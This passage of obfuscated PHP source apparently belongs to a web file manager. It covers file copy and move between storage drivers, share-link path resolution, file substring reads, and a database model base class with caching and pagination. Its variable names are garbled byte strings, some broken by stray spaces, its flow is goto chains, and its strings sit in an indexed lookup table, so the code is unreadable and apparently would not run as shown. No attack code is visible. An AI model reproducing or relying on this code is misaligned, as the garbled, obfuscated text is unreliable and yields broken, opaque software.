f«ˆ­ò÷: $b†–„—†Š¢ = $BÍ™’Ï÷îÜ->iconvApp($b†–„—†Š¢); $f„±«Ò·ÈÔ = $cŞˆ¢‚°æ’->upload($aæÆ½‹ƒ¡, $b†–„—†Š¢, $F“»Ÿ¹óÂª); self::remove($AÄó«ã»–ß . $D–…—×³ù‡); goto A´¨î›ñùâ; a„±Ù•ô: mk_dir($AÄó«ã»–ß); $b†–„—†Š¢ = $AÄó«ã»–ß . $D–…—×³ù‡; $b†–„—†Š¢ = $BÍ™’Ï÷îÜ->download($Cë‘Şé¡Ñª, $b†–„—†Š¢); goto f«ˆ­ò÷; A´¨î›ñùâ: Hook::trigger($C¥“ƒ‘—²»[993], $BÍ™’Ï÷îÜ, $Cë‘Şé¡Ñª, $cŞˆ¢‚°æ’, $aæÆ½‹ƒ¡, $dğ¸Í¼ª“‚, $f„±«Ò·ÈÔ); return $f„±«Ò·ÈÔ; goto B½—Ëã…È; a±µçİÏš‘: Hook::trigger($C¥“ƒ‘—²»[992], $BÍ™’Ï÷îÜ, $Cë‘Şé¡Ñª, $cŞˆ¢‚°æ’, $aæÆ½‹ƒ¡, $dğ¸Í¼ª“‚, $D–…—×³ù‡); if (self::driverIsSame($BÍ™’Ï÷îÜ, $cŞˆ¢‚°æ’)) { if ($F“»Ÿ¹óÂª) { $f„±«Ò·ÈÔ = $cŞˆ¢‚°æ’->moveFile($Cë‘Şé¡Ñª, $aæÆ½‹ƒ¡); } else { $f„±«Ò·ÈÔ = $cŞˆ¢‚°æ’->copyFile($Cë‘Şé¡Ñª, $aæÆ½‹ƒ¡); } Hook::trigger($C¥“ƒ‘—²»[993], $BÍ™’Ï÷îÜ, $Cë‘Şé¡Ñª, $cŞˆ¢‚°æ’, $aæÆ½‹ƒ¡, $dğ¸Í¼ª“‚, $f„±«Ò·ÈÔ); return $f„±«Ò·ÈÔ; } $AÄó«ã»–ß = TEMP_FILES; goto a„±Ù•ô; B½—Ëã…È: } public static function pathFather($a“¾££Å‘İ) { $d¢Äˆó¤ëí = IO::init($a“¾££Å‘İ); $aù†Ã¤´öñ = $d¢Äˆó¤ëí->pathFather($d¢Äˆó¤ëí->path); return $d¢Äˆó¤ëí->getPathOuter($aù†Ã¤´öñ); } public static function fileOut($e¤¬ˆã²î¤, $cŞğŒğÕ— = false, $Aé›Šçˆ²º = false, $B‹¨ªÙÊËì = '') { $DĞ©×ÂïØ¼ = self::driverMake($e¤¬ˆã²î¤); if ($DĞ©×ÂïØ¼->isFileOutServer()) { return $DĞ©×ÂïØ¼->fileOutServer($e¤¬ˆã²î¤, $cŞğŒğÕ—, $Aé›Šçˆ²º, $B‹¨ªÙÊËì); } return $DĞ©×ÂïØ¼->fileOut($e¤¬ˆã²î¤, $cŞğŒğÕ—, $Aé›Šçˆ²º, $B‹¨ªÙÊËì); } public static function fileOutImage($aˆ‰ìòË³â, $D®Ü©ÂÕÎá = 250) { $DÛ›ÍÉ³„ß = array(250, 600, 1200, 3000); for ($dÀªÃ™™Ş = 0; $dÀªÃ™™Ş < count($DÛ›ÍÉ³„ß); $dÀªÃ™™Ş++) { if ($dÀªÃ™™Ş == 0 && $D®Ü©ÂÕÎá <= $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]) { $D®Ü©ÂÕÎá = $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]; break; } else { if ($D®Ü©ÂÕÎá > $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş - 1] && $D®Ü©ÂÕÎá <= $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]) { $D®Ü©ÂÕÎá = $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]; break; } else { if ($dÀªÃ™™Ş == count($DÛ›ÍÉ³„ß) - 1 && $D®Ü©ÂÕÎá > $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]) { $D®Ü©ÂÕÎá = $DÛ›ÍÉ³„ß[$dÀªÃ™™Ş]; break; } } } } $fÒåÂ­öåˆ = self::driverMake($aˆ‰ìòË³â); if ($fÒåÂ­öåˆ->isFileOutServer()) { return $fÒåÂ­öåˆ->fileOutImageServer($aˆ‰ìòË³â, $D®Ü©ÂÕÎá); } return $fÒåÂ­öåˆ->fileOutImage($aˆ‰ìòË³â, $D®Ü©ÂÕÎá); } private static function driverIsSame($Aå‡¹·’çó, $a¼ÛÆİÛ·¬) { goto bÅÊÙ©ğ£°; bÅÊÙ©ğ£°: $BñŞê„·ˆ =& $_SERVER[£ü]; $E˜¥­ÍÛÃ† = $Aå‡¹·’çó->getType(); $fÛóÖ…Ãˆğ = $a¼ÛÆİÛ·¬->getType(); goto Eî ƒ‘ ß; AˆÆ¾‚ÜÆ—: if ($Aå‡¹·’çó->pathDriver == $a¼ÛÆİÛ·¬->pathDriver) { return !0; } return !1; goto Eêô£ì¸®†; Eî ƒ‘ ß: if ($E˜¥­ÍÛÃ† != $fÛóÖ…Ãˆğ) { return !1; } if ($E˜¥­ÍÛÃ† == $BñŞê„·ˆ[683]) { return !0; } if ($E˜¥­ÍÛÃ† == $BñŞê„·ˆ[103]) { return !0; } goto AˆÆ¾‚ÜÆ—; Eêô£ì¸®†: } public static function copyUpdate($BÓ„ï©«’Û, $bœá¹í â¯) { goto C×åíÀšİ; E†Èöˆô²è: Hook::trigger($BÔÏ•¡Ç¤ë[997], $BÓ„ï©«’Û, $bœá¹í â¯, $c„ÖãÑª); foreach ($eõœ´ƒº› as $EšëÙ§­Ûì) { IO::mkdir($EšëÙ§­Ûì); } foreach ($BÂ§½ßË»é as $EšëÙ§­Ûì) { IO::copy($EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[994]], $EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[995]], REPEAT_REPLACE); } goto AîïÌ…·Ó; CŠ©©ª—âˆ: $BŞÊøöÅŠ = self::_listAll($BÓ„ï©«’Û); $C¯³Æéèî = self::_listAll($bœá¹í â¯); $BÂ§½ßË»é = array(); goto D£¶Âì˜é¨; C×åíÀšİ: $BÔÏ•¡Ç¤ë =& $_SERVER[£ü]; if (!IO::exist($BÓ„ï©«’Û)) { return !1; } if (!IO::exist($bœá¹í â¯)) { IO::mkdir($bœá¹í â¯); } goto CŠ©©ª—âˆ; D£¶Âì˜é¨: $eõœ´ƒº› = array(); foreach ($BŞÊøöÅŠ as $bº…Ñ°Ñ–Õ => $EšëÙ§­Ûì) { if (isset($C¯³Æéèî[$bº…Ñ°Ñ–Õ])) { if ($EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[76]] == 1) { continue; } if ($C¯³Æéèî[$bº…Ñ°Ñ–Õ][$BÔÏ•¡Ç¤ë[77]] == $EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[77]]) { continue; } } if ($EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[76]] == 1) { $eõœ´ƒº›[] = $bœá¹í â¯ . $BÔÏ•¡Ç¤ë[8] . $bº…Ñ°Ñ–Õ; continue; } $e«ˆ‘£ğÓ = strstr(trim($bº…Ñ°Ñ–Õ, $BÔÏ•¡Ç¤ë[8]), $BÔÏ•¡Ç¤ë[8]) ? get_path_father($bº…Ñ°Ñ–Õ) : $BÔÏ•¡Ç¤ë[33]; $BÂ§½ßË»é[] = array($BÔÏ•¡Ç¤ë[994] => $EšëÙ§­Ûì[$BÔÏ•¡Ç¤ë[75]], $BÔÏ•¡Ç¤ë[995] => rtrim($bœá¹í â¯, $BÔÏ•¡Ç¤ë[8]) . $BÔÏ•¡Ç¤ë[8] . $e«ˆ‘£ğÓ, $BÔÏ•¡Ç¤ë[996] => $EšëÙ§­Ûì); } $c„ÖãÑª = array($BÔÏ•¡Ç¤ë[164] => $BÂ§½ßË»é, $BÔÏ•¡Ç¤ë[76] => $eõœ´ƒº›); goto E†Èöˆô²è; AîïÌ…·Ó: } private static function _listAll($bå¥¬…áø) { $Cáº­˜šñ =& $_SERVER[£ü]; $bå¥¬…áø = KodIO::clear($bå¥¬…áø); $eËÚ„‹Ê = IO::listAll($bå¥¬…áø); foreach ($eËÚ„‹Ê as &$BÓ†ÅÕñ¨ó) { $A¶Ÿ–‘† = substr($BÓ†ÅÕñ¨ó[$Cáº­˜šñ[75]], strlen($bå¥¬…áø)); $BÓ†ÅÕñ¨ó[$Cáº­˜šñ[998]] = trim($A¶Ÿ–‘†, $Cáº­˜šñ[8]); } return array_to_keyvalue($eËÚ„‹Ê, $Cáº­˜šñ[998]); } public static function fileSubstr($d’«å»ë°, $B‚äºæ×Á£, $B¯µ·ƒ­× = false) { goto bˆœŒİ‘’²; CåÓ‚—ğ…å: return $f’ÃíÛãÒÂ->fileSubstr($d’«å»ë°, $B‚äºæ×Á£, $B¯µ·ƒ­×); goto FÊ½ÓÛÂ‘—; CÔïÑ–ÊÏà: $FÌ†‡Àìˆî = $B¯µ·ƒ­×; if ($B‚äºæ×Á£ < 0) { $B‚äºæ×Á£ = $d£ñ¥Øó‚ö + $B‚äºæ×Á£; } if ($B¯µ·ƒ­× === !1) { $B¯µ·ƒ­× = $d£ñ¥Øó‚ö - $B‚äºæ×Á£; } goto C¥İ†é’¤; bˆœŒİ‘’²: $f’ÃíÛãÒÂ = self::driverMake($d’«å»ë°); $d£ñ¥Øó‚ö = $f’ÃíÛãÒÂ->size($d’«å»ë°); $FæØ¨£“¹ = $B‚äºæ×Á£; goto CÔïÑ–ÊÏà; C¥İ†é’¤: if ($B‚äºæ×Á£ + $B¯µ·ƒ­× > $d£ñ¥Øó‚ö) { $B¯µ·ƒ­× = $d£ñ¥Øó‚ö - $B‚äºæ×Á£; } if ($B¯µ·ƒ­× <= 0) { return $_SERVER[£ü][33]; } if ($B‚äºæ×Á£ < 0 || $B‚äºæ×Á£ >= $d£ñ¥Øó‚ö || $B¯µ·ƒ­× > 1024 * 1024 * 5) { throw new Exception("\x66\x69\x6c\x65\x52\x65\x61\144\40\145\162\162\157\162\x21\40\163\x74\x61\x72\x74\75{$B‚äºæ×Á£}\73\x6c\x65\x6e\x67\x74\x68\x3d{$B¯µ·ƒ­×}\73\40\x73\x69\172\145\75{$d£ñ¥Øó‚ö}\73"); } goto CåÓ‚—ğ…å; FÊ½ÓÛÂ‘—: } private static function driverMake(&$B¥ÁŒ§Ï•Ê) { goto b¾±‹—ßÜ; b¾±‹—ßÜ: $bÙ¡Øµ´¤½ =& $_SERVER[£ü]; $B®Á¹ØÍ‘ì = KodIO::parse($B¥ÁŒ§Ï•Ê); if (!self::$driverListSystem) { $b¹…àô¥ãô = Model($bÙ¡Øµ´¤½[693])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($b¹…àô¥ãô, $bÙ¡Øµ´¤½[364]); } goto fùĞâšÏò; fùĞâšÏò: if ($B®Á¹ØÍ‘ì[$bÙ¡Øµ´¤½[29]] == KodIO::KOD_IO && !self::$driverListSystem[$B®Á¹ØÍ‘ì[$bÙ¡Øµ´¤½[364]]]) { return !1; } $B¥ÁŒ§Ï•Ê = $B®Á¹ØÍ‘ì[$bÙ¡Øµ´¤½[999]]; $c£¤Æ¾Ş…² = self::driverGet($B®Á¹ØÍ‘ì, $B¥ÁŒ§Ï•Ê); goto b‰•Äš¥Öâ; b‰•Äš¥Öâ: return $c£¤Æ¾Ş…²; goto D‹†‹ØŸÆ; D‹†‹ØŸÆ: } private static function driverGet($DÀÊñï‹ÎŞ, &$a£Ò²ÖÎ±ß) { goto Eå‘—«É¹; aêƒ×Š™’—: $aÍ”÷øŞ£÷ = self::$driverCache[$B¿†òäÕÃÖ]; $aÍ”÷øŞ£÷->pathDriver = $FŞ³º×Õ¢­; $aÍ”÷øŞ£÷->pathBase = $E‘ŠÕğˆà[33]; goto a°éÎï‰éÒ; A¬ÃÔÄœ´å: $aÍ”÷øŞ£÷->path = $a£Ò²ÖÎ±ß; return $aÍ”÷øŞ£÷; goto Aë¦®Âìò; e¸¢ŞÓ÷µ÷: switch ($DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[29]]) { case KodIO::KOD_IO: $cÊØÀ·¾ = self::$driverListSystem[$FĞ›ŒíÖª¤]; break; case KodIO::KOD_SOURCE: $a£Ò²ÖÎ±ß = $FĞ›ŒíÖª¤ . $a£Ò²ÖÎ±ß; $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1002], $E‘ŠÕğˆà[6] => $DÀÊñï‹ÎŞ); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $C‰¹ÂÊ¿¤ = $GLOBALS[$E‘ŠÕğˆà[1003]]; self::$driverListUser = array_to_keyvalue($C‰¹ÂÊ¿¤, $E‘ŠÕğˆà[364]); } $cÊØÀ·¾ = self::$driverListUser[$FĞ›ŒíÖª¤]; break; case KodIO::KOD_SHARE_LINK: $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1004], $E‘ŠÕğˆà[6] => $DÀÊñï‹ÎŞ); $AÓ•ÂÖ‹ñÏ = Action($E‘ŠÕğˆà[1005])->sharePathInfo($DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[75]]); $a£Ò²ÖÎ±ß = $AÓ•ÂÖ‹ñÏ[$E‘ŠÕğˆà[366]]; if (!$AÓ•ÂÖ‹ñÏ[$E‘ŠÕğˆà[366]]) { $d‹ÇáœâãÂ = Model($E‘ŠÕğˆà[532])->getInfo($AÓ•ÂÖ‹ñÏ[$E‘ŠÕğˆà[437]]); $a£Ò²ÖÎ±ß = KodIO::clear($d‹ÇáœâãÂ[$E‘ŠÕğˆà[1006]] . $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[999]]); $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[435]] = $d‹ÇáœâãÂ; $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[986]] = $a£Ò²ÖÎ±ß; $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1007], $E‘ŠÕğˆà[6] => $DÀÊñï‹ÎŞ); } break; case KodIO::KOD_SHARE_ITEM: $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1008], $E‘ŠÕğˆà[6] => $DÀÊñï‹ÎŞ); $d‹ÇáœâãÂ = Model($E‘ŠÕğˆà[532])->getInfo($DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[364]]); if ($d‹ÇáœâãÂ[$E‘ŠÕğˆà[366]] == $E‘ŠÕğˆà[464]) { $a£Ò²ÖÎ±ß = KodIO::clear($d‹ÇáœâãÂ[$E‘ŠÕğˆà[1006]] . $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[999]]); $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[435]] = $d‹ÇáœâãÂ; $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[986]] = $a£Ò²ÖÎ±ß; $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1009], $E‘ŠÕğˆà[6] => $DÀÊñï‹ÎŞ); } break; default: $a£Ò²ÖÎ±ß = $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[75]]; $cÊØÀ·¾ = array($E‘ŠÕğˆà[1001] => $E‘ŠÕğˆà[1010]); break; } $B¿†òäÕÃÖ = $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[75]]; if (!isset(self::$driverCache[$B¿†òäÕÃÖ])) { $e‘¾À¥ÉÀë = strtolower($cÊØÀ·¾[$E‘ŠÕğˆà[90]]); $e‡êÏ……‡¨ = $GLOBALS[$E‘ŠÕğˆà[6]][$E‘ŠÕğˆà[84]][$E‘ŠÕğˆà[1011]]; $E‘Œ¯œÊù­ = $E‘ŠÕğˆà[71] . (isset($e‡êÏ……‡¨[$e‘¾À¥ÉÀë]) ? $e‡êÏ……‡¨[$e‘¾À¥ÉÀë] : ucfirst($e‘¾À¥ÉÀë)); if (!class_exists($E‘Œ¯œÊù­)) { show_json("{$E‘Œ¯œÊù­}\40\156\157\164\40\145\170\x69\x73\x74\x73\x21", !1); } $e°¨¥ù¶—Â = isset($cÊØÀ·¾[$E‘ŠÕğˆà[6]]) ? $cÊØÀ·¾[$E‘ŠÕğˆà[6]] : !1; self::$driverCache[$B¿†òäÕÃÖ] = new $E‘Œ¯œÊù­($e°¨¥ù¶—Â); } goto aêƒ×Š™’—; Eå‘—«É¹: $E‘ŠÕğˆà =& $_SERVER[£ü]; $FŞ³º×Õ¢­ = $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[1000]]; $FĞ›ŒíÖª¤ = $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[364]]; goto e¸¢ŞÓ÷µ÷; a°éÎï‰éÒ: if (isset($cÊØÀ·¾[$E‘ŠÕğˆà[6]][$E‘ŠÕğˆà[1012]])) { $aÍ”÷øŞ£÷->pathBase = rtrim($cÊØÀ·¾[$E‘ŠÕğˆà[6]][$E‘ŠÕğˆà[1012]], $E‘ŠÕğˆà[8]) . $E‘ŠÕğˆà[8]; $a£Ò²ÖÎ±ß = $aÍ”÷øŞ£÷->pathBase . ltrim($a£Ò²ÖÎ±ß, $E‘ŠÕğˆà[8]); } $a£Ò²ÖÎ±ß = $aÍ”÷øŞ£÷->getPath($a£Ò²ÖÎ±ß); if (isset($DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[986]])) { $a£Ò²ÖÎ±ß = $DÀÊñï‹ÎŞ[$E‘ŠÕğˆà[986]]; } goto A¬ÃÔÄœ´å; Aë¦®Âìò: } } $D ËÃ™ªÜí = LIB_DIR . $_SERVER[£ü][1013]; goto c³ÒŸ ›”á; cÌ¬‹É‰Ô: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\x64\151\146\171\x54\x69\155\x65", "\x74\x69\x6d\145", "\x69\156\163\x65\x72\x74\x2c\165\x70\144\141\164\x65", "\x66\x75\156\x63\164\151\x6f\x6e"), array("\x63\162\x65\141\x74\145\x54\x69\x6d\x65", "\x74\151\155\x65", "\x69\156\163\145\162\x74", "\146\x75\156\143\164\x69\157\x6e")); public function setDataAuto($f½éãÀç›“) { $this->dataAuto = $f½éãÀç›“; } public function __construct($c‚Ò’Ó»„à = '', $cÎ³ÔÜÜ®¼ = '', $FÊÛÑ¾àô  = '') { parent::__construct($c‚Ò’Ó»„à, $cÎ³ÔÜÜ®¼, $FÊÛÑ¾àô ); } public static function textEncode($Bî÷”œíĞ) { if (!$Bî÷”œíĞ) { return $Bî÷”œíĞ; } $a‹æà²´Á = json_encode($Bî÷”œíĞ); $a‹æà²´Á = preg_replace_callback($_SERVER[£ü][339], function ($BË¬ÒóöŠÂ) { return addslashes($BË¬ÒóöŠÂ[0]); }, $a‹æà²´Á); return json_decode($a‹æà²´Á); } public static function textDecode($Dõ‰óö„ê) { $dŒ½©…ñ =& $_SERVER[£ü]; $dó«¯óÙ“ = json_encode($Dõ‰óö„ê); $dó«¯óÙ“ = preg_replace_callback($dŒ½©…ñ[340], function ($a×ËÒ¸™íë) { return $_SERVER[£ü][95]; }, $dó«¯óÙ“); return json_decode($dó«¯óÙ“); } protected $tableMeta = array(); protected function _beforeInsert(&$D÷é½±†ùº, $CÎƒ¥Ó—İ) { $d•ï¹¶ÛŠ˜ =& $_SERVER[£ü]; if (!$this->checkDataAutoHas($d•ï¹¶ÛŠ˜[341])) { return; } $this->dataBeforeFilter($D÷é½±†ùº, $d•ï¹¶ÛŠ˜[341]); } protected function _beforeUpdate(&$DğøÎĞÛ«Í, $a–×¨İ»¼İ) { $EÒùÍ›ø†¼ =& $_SERVER[£ü]; if (!$this->checkDataAutoHas($EÒùÍ›ø†¼[342])) { return; } $this->dataBeforeFilter($DğøÎĞÛ«Í, $EÒùÍ›ø†¼[342]); } protected function _afterSelect(&$a÷îášêÖê, $Döõù‘ëÁ) { if (!is_array($a÷îášêÖê)) { return; } if (!$this->checkDataAutoHas($_SERVER[£ü][343])) { return; } foreach ($a÷îášêÖê as &$b¡¥Ø‹À½) { $this->dataAfterFilter($b¡¥Ø‹À½); } } protected function _afterFind(&$BôÉ“—†‹‡, $F‰‘ƒ šêˆ) { if (!is_array($BôÉ“—†‹‡)) { return; } if (!$this->checkDataAutoHas($_SERVER[£ü][343])) { return; } $this->dataAfterFilter($BôÉ“—†‹‡); } public function setAutoIncrement($Dî¢²–²±ç) { $AËÓÁÂÈÜ = array($this->getPk() => $Dî¢²–²±ç); $B”¬•¿óë = $this->data($AËÓÁÂÈÜ)->add(); if ($B”¬•¿óë) { $this->delete($B”¬•¿óë); } } public function getAutoIncrement() { $b‡ÒŒÄŠ‘ = $this->getTableName(); $Cô¦ÂÄ‡® = $this->max($this->getPk()); $cò—òÃö®Š = $this->query("\x73\x68\157\x77\x20\x74\x61\x62\154\x65\40\x73\164\x61\164\165\x73\x20\x77\x68\x65\x72\x65\x20\x4e\141\x6d\x65\x3d\x27{$b‡ÒŒÄŠ‘}\47"); $eŠÀÁ¤Ûàí = $cò—òÃö®Š[0][$_SERVER[£ü][344]]; $cÑ­×á¼ = max($Cô¦ÂÄ‡®, $eŠÀÁ¤Ûàí); return $cÑ­×á¼; } protected function _callBefore($FƒÓ›îßŒª, $a™šŠ§§) { return $this->cacheCallCheck($FƒÓ›îßŒª, $a™šŠ§§, !1); } protected function _callAfter($CÈâ‰À£¿, $B¸Š¹²Ñ™) { return $this->cacheCallCheck($CÈâ‰À£¿, $B¸Š¹²Ñ™, !0); } protected function cacheFunctionAlias($e„µÕÈÔ‡ñ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F¬ªßˆ„„ë, $eøŸ¦ñˆ¤¶, $bÛÄØÒö¡ = false) { $c«Õ™éæ˜¿ = $this->cacheFunctionAlias($eøŸ¦ñˆ¤¶); if (!$c«Õ™éæ˜¿) { return; } foreach ($c«Õ™éæ˜¿ as $A·‚¹ß‘¤® => $BÙ¹Üè…È) { $Dš÷öÕˆê = $BÙ¹Üè…È[0]; $b³–¯àÜå¯ = explode($_SERVER[£ü][47], $BÙ¹Üè…È[1]); if ($F¬ªßˆ„„ë == $A·‚¹ß‘¤®) { return $this->cacheFunctionGet($A·‚¹ß‘¤®, $Dš÷öÕˆê); } if ($bÛÄØÒö¡ && in_array($F¬ªßˆ„„ë, $b³–¯àÜå¯)) { $this->cacheFunctionClear($A·‚¹ß‘¤®, $Dš÷öÕˆê); } } } public function cacheFunctionGet($d§¯¦×¬, $FÅ“ŞÊ’…³) { $dÃ®Ì‘±Ş = $this->cacheKeyMake($d§¯¦×¬, $FÅ“ŞÊ’…³); $Fš¨ĞåãÂá = Cache::get($dÃ®Ì‘±Ş); if (!is_array($Fš¨ĞåãÂá)) { $Fš¨ĞåãÂá = call_user_func_array(array($this, $d§¯¦×¬), array($FÅ“ŞÊ’…³, !0)); Cache::set($dÃ®Ì‘±Ş, $Fš¨ĞåãÂá); } return $Fš¨ĞåãÂá; } public function cacheFunctionClear($Aõ¨¶„, $eÁ¬“Ï×¹) { $AÚËš’¯‹ = $eÁ¬“Ï×¹; if (!is_array($eÁ¬“Ï×¹)) { $AÚËš’¯‹ = array($eÁ¬“Ï×¹); } foreach ($AÚËš’¯‹ as $aŸ…Õ·´Áâ) { $b«Şæ¢‹ñï = $this->cacheKeyMake($Aõ¨¶„, $aŸ…Õ·´Áâ); Cache::remove($b«Şæ¢‹ñï); } } private function cacheKeyMake($aãõ¡êƒ²È, $aÓ†ğç¿îé) { $cˆŒ¬–»› =& $_SERVER[£ü]; return get_class($this) . $cˆŒ¬–»›[70] . $aãõ¡êƒ²È . $cˆŒ¬–»›[345] . $aÓ†ğç¿îé; } protected function selectPage($a‰è£¡“Áš = 200, $B¡ Õ‘í¼Î = 1) { goto FŒŒ¡¬„£Ç; e“ÃÕ×¤®: $this->optionsValue($F™ğ¼µ ‹ˆ); $bàË‰ÚİŠé = $this->page($B¡ Õ‘í¼Î, $a‰è£¡“Áš)->select(); $bàË‰ÚİŠé = is_array($bàË‰ÚİŠé) ? $bàË‰ÚİŠé : array(); goto eÓÇº¾å·Ñ; eÓÇº¾å·Ñ: if ($AìÖ == 1) { $dÊÁäÜ‡Õß = count($bàË‰ÚİŠé); } $F‰……²‚™ = array($fÏ¡ë‘Ñ…»[348] => array($fÏ¡ë‘Ñ…»[349] => $dÊÁäÜ‡Õß, $fÏ¡ë‘Ñ…»[346] => $a‰è£¡“Áš, $fÏ¡ë‘Ñ…»[337] => $B¡ Õ‘í¼Î, $fÏ¡ë‘Ñ…»[350] => $AìÖ), $fÏ¡ë‘Ñ…»[351] => $bàË‰ÚİŠé ? $bàË‰ÚİŠé : array()); return $F‰……²‚™; goto dÚî…ù®š½; añİ÷Íø…Õ: $eª‹¿‰ìˆ = 4000; $a‰è£¡“Áš = isset($in[$fÏ¡ë‘Ñ…»[346]]) ? $in[$fÏ¡ë‘Ñ…»[346]] : $a‰è£¡“Áš; if ($a‰è£¡“Áš === -1) { unset($in[$fÏ¡ë‘Ñ…»[346]]); $eª‹¿‰ìˆ = 100000000; $a‰è£¡“Áš = $eª‹¿‰ìˆ; } goto Dôîà§Ìã; FÄÄ®ŒËº†: $dÊÁäÜ‡Õß = intval($this->count()); $a‰è£¡“Áš = intval($a‰è£¡“Áš); $a‰è£¡“Áš = $a‰è£¡“Áš <= 5 ? 5 : ($a‰è£¡“Áš >= $eª‹¿‰ìˆ ? $eª‹¿‰ìˆ : $a‰è£¡“Áš); goto D²ô••§‹‰; FŒŒ¡¬„£Ç: $fÏ¡ë‘Ñ…» =& $_SERVER[£ü]; global $in; $F™ğ¼µ ‹ˆ = $this->optionsValue(); goto añİ÷Íø…Õ; D²ô••§‹‰: $AìÖ = ceil($dÊÁäÜ‡Õß / $a‰è£¡“Áš); $B¡ Õ‘í¼Î = intval(isset($in[$fÏ¡ë‘Ñ…»[337]]) ? $in[$fÏ¡ë‘Ñ…»[337]] : $B¡ Õ‘í¼Î); $B¡ Õ‘í¼Î = $B¡ Õ‘í¼Î <= 1 ? 1 : ($B¡ Õ‘í¼Î >= $AìÖ ? $AìÖ : $B¡ Õ‘í¼Î); goto e“ÃÕ×¤®; Dôîà§Ìã: $Däİ‘ÎŸñ = $F™ğ¼µ ‹ˆ; $Däİ‘ÎŸñ[$fÏ¡ë‘Ñ…»[347]] = array(); $this->optionsValue($Däİ‘ÎŸñ); goto FÄÄ®ŒËº†; dÚî…ù®š½: } protected function checkLength($dŞ·ÍĞ¤„ª, $AµÌ¿ƒ‚–‡ = 0, $E„Ë‚É‚áñ = '') { $EÂŸ¿§²š® =& $_SERVER[£ü]; $AµÌ¿ƒ‚–‡ = $AµÌ¿ƒ‚–‡ ? $AµÌ¿ƒ‚–‡ : 65536; if (!$dŞ·ÍĞ¤„ª || strlen($dŞ·ÍĞ¤„ª) < $AµÌ¿ƒ‚–‡) { return; } $E„Ë‚É‚áñ = $E„Ë‚É‚áñ ? $E„Ë‚É‚áñ . $EÂŸ¿§²š®[67] : $EÂŸ¿§²š®[33]; show_json($E„Ë‚É‚áñ . LNG($EÂŸ¿§²š®[352]) . "\50{$AµÌ¿ƒ‚–‡}\x29", !1); } protected function metaSet($Aõóæ‰É¬, $Fí ùÜ‰ƒ = null, $båÓ¼àÜÎ = null) { goto CšŸ¹Ÿ±ßÏ; aªŠ¾†…Ï: $DÏØµöØÜ«->where(array($EÂ‚í†¹¡ç => $Aõóæ‰É¬))->addAll($BŞÉÙ‰Ü–î, array(), !0); return !0; goto c…İ‚ºæŸ¾; CšŸ¹Ÿ±ßÏ: $b˜®Œ¼¾ïÚ =& $_SERVER[£ü]; if (!$this->tableMeta) { return !1; } $EÂ‚í†¹¡ç = $this->tableMeta[$b˜®Œ¼¾ïÚ[353]]; goto C¯ºÑ©èÇ; c––©µâ„: if (is_string($Fí ùÜ‰ƒ)) { $CÃæ™â¼²Ü[$Fí ùÜ‰ƒ] = $båÓ¼àÜÎ; } $BŞÉÙ‰Ü–î = array(); foreach ($CÃæ™â¼²Ü as $eè‡ç­ÑÎ› => $Bê‰¨¤è’) { $this->checkLength($Bê‰¨¤è’, !1, $EÉˆòŠ±Ë . $b˜®Œ¼¾ïÚ[4] . $eè‡ç­ÑÎ›); $BŞÉÙ‰Ü–î[] = array($EÂ‚í†¹¡ç => $Aõóæ‰É¬, $b˜®Œ¼¾ïÚ[89] => $eè‡ç­ÑÎ›, $b˜®Œ¼¾ïÚ[356] => $Bê‰¨¤è’); } goto aªŠ¾†…Ï; cİ¦—±Èß: if (is_null($Fí ùÜ‰ƒ)) { return $DÏØµöØÜ«->where(array($EÂ‚í†¹¡ç => $Aõóæ‰É¬))->delete(); } if (is_null($båÓ¼àÜÎ)) { return $DÏØµöØÜ«->where($D§óÕ–ÑŞ)->delete(); } $CÃæ™â¼²Ü = is_array($Fí ùÜ‰ƒ) ? $Fí ùÜ‰ƒ : array(); goto c––©µâ„; C¯ºÑ©èÇ: $EÉˆòŠ±Ë = $this->tableMeta[$b˜®Œ¼¾ïÚ[354]]; $DÏØµöØÜ« = Model($EÉˆòŠ±Ë); $D§óÕ–ÑŞ = array($EÂ‚í†¹¡ç => $Aõóæ‰É¬, $b˜®Œ¼¾ïÚ[355] => $Fí ùÜ‰ƒ); goto cİ¦—±Èß; c…İ‚ºæŸ¾: } public function metaGet($B±‚—÷ÂŞô) { goto bõ„ÆĞÎÜâ; bõ„ÆĞÎÜâ: $dƒì‘ªòùê =& $_SERVER[£ü]; if (!$this->tableMeta) { return array(); } $fŸ¶˜ÙŸ„× = $this->tableMeta[$dƒì‘ªòùê[353]]; goto fŒæ·ª´š; cø§ä™‡™Ó: $eˆ·Ì˜™ô = array_to_keyvalue($eˆ·Ì˜™ô, $dƒì‘ªòùê[89], $dƒì‘ªòùê[356]); return 